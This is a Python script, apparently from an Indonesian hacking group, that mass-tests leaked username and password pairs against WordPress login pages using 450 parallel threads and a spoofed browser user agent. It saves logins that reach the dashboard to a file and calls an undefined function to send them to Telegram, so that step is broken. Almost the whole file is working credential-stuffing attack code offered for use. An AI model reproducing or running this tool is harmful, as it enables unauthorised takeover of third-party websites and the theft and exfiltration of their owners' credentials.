import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import sys
import time

# Colorama initialization
init(autoreset=True)

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}

def attempt_login(wp_url_credentials):
    try:
        parts = wp_url_credentials.split("#")
        site = parts[0]
        creds = parts[1].split("@")
        user, passwd = creds
        response = requests.post(site, headers=headers, data={'log': user, 'pwd': passwd, 'wp-submit': 'Log In'}, timeout=10)
        if 'Dashboard' in response.text:
            print(Fore.GREEN + f"[Success] --> {site}")
            with open("wp-login-success.txt", "a", encoding="utf-8") as file:
                file.write(f"{site}#{user}@{passwd}\n")
            send_telegram_message(f"Successful login: {site}#{user}@{passwd}")
        else:
            print(Fore.RED + f"[Failed] --> {site}")
            with open("wp-login-failed.txt", "a", encoding="utf-8") as file:
                file.write(f"{site}#{user}@{passwd}\n")
    except (requests.exceptions.SSLError, requests.exceptions.ConnectionError):
        pass
    except Exception as e:
        pass

def print_with_animation(text, delay=0.05):
    """Function to print text with typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Newline after printing the text

def main():
    init(autoreset=True)

    # ASCII Art as requested (Banner Part 1)
    banner_part1 = Fore.RED + """
░█▀▀▀█ █▀▀ █▀▀█ █▀▀▄ ░█─── █▀▀█ █▀▀▀ █▀▀ 
─▀▀▀▄▄ █── █▄▄█ █──█ ░█─── █──█ █─▀█ ▀▀█ 
░█▄▄▄█ ▀▀▀ ▀──▀ ▀──▀ ░█▄▄█ ▀▀▀▀ ▀▀▀▀ ▀▀▀ 

░█▀▀▄ █▀▀█ █▀▀▄ █▀▀ █▀▀█ █─█ 
░█─░█ █▄▄█ █──█ █── █──█ █▀▄ 
░█▄▄▀ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀▀ ▀─▀
    """

    print(banner_part1)

    # Print "Coding By" and "Team" with animation
    print_with_animation(Fore.GREEN + "Coding By: FidzXploit", 0.1)
    print_with_animation(Fore.GREEN + "Team: IndoHaxSec Team", 0.1)

    print(Fore.GREEN + "Enter the path to your list: ", end="")
    file_path = input()
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            wp_list = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "File not found, please check the path and try again.")
        return
    except UnicodeDecodeError:
        print(Fore.RED + "Unable to read the file with UTF-8 encoding. Please check the file encoding.")
        return

    with ThreadPoolExecutor(max_workers=450) as executor:
        executor.map(attempt_login, wp_list)

if __name__ == "__main__":
    main()
